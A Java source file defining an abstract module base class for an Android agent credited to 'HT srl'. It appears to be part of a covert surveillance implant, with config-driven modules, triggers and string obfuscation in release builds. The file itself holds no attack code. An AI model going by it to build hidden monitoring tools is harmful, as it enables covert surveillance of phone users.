/* **********************************************
 * Create by : Alberto "Q" Pelliccione
 * Company   : HT srl
 * Project   : AndroidService
 * Created   : 30-mar-2011
 **********************************************/

package com.android.dvci.module;

import com.android.dvci.ProcessInfo;
import com.android.dvci.ThreadBase;
import com.android.dvci.Trigger;
import com.android.dvci.auto.Cfg;
import com.android.dvci.conf.ConfModule;
import com.android.dvci.conf.ConfigurationException;
import com.android.dvci.manager.ManagerModule;
import com.android.dvci.util.Check;
import com.android.mm.M;

/**
 * The Class AgentBase.
 */
public abstract class BaseModule extends ThreadBase {
	private static final String TAG = "BaseModule"; //$NON-NLS-1$
	private ConfModule conf;
	private Trigger trigger;

	/**
	 * Parses the.
	 * 
	 * @param conf
	 *            the conf
	 * @throws ConfigurationException
	 */
	protected abstract boolean parse(ConfModule conf);

	public String getType() {
		return ManagerModule.self().getType(this.getClass());
	}

	public boolean setConf(ConfModule conf) {
		if (Cfg.DEBUG) {
			Check.requires(conf != null, "null conf");
		}
		this.conf = conf;
		return parse(conf);
	}

	@Override
	public String toString() {
		if(Cfg.DEBUG) {
			return "Module <" + conf.getType().toUpperCase() + "> " + (isRunning() ? "running" : ""); //$NON-NLS-1$ //$NON-NLS-2$ //$NON-NLS-3$ //$NON-NLS-4$
		}else{
			return M.e("Module ") + conf.getType().toUpperCase();
		}
	}

	public void setTrigger(Trigger trigger) {
		this.trigger = trigger;
	}
	
	public boolean isInstanced(){
		return  ManagerModule.self().isInstancedAgent(getType());
	}

	public void notifyProcess(ProcessInfo b) {
	}

}